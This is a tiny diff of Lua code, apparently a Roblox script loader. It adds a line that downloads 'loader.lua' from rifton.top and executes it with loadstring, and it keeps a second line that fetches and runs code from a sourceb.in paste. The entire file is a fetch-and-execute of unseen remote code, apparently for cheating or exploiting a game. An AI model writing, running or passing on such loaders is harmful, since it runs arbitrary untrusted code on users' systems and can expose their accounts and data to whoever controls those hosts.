@@ -1,5 +1,5 @@
 task.spawn(function()
-https://rifton.top/loader.lua
+loadstring(game:HttpGet("https://rifton.top/loader.lua"))()
 end)
 task.wait(0.2)
 loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Fd6Hchvxg2/0"))()
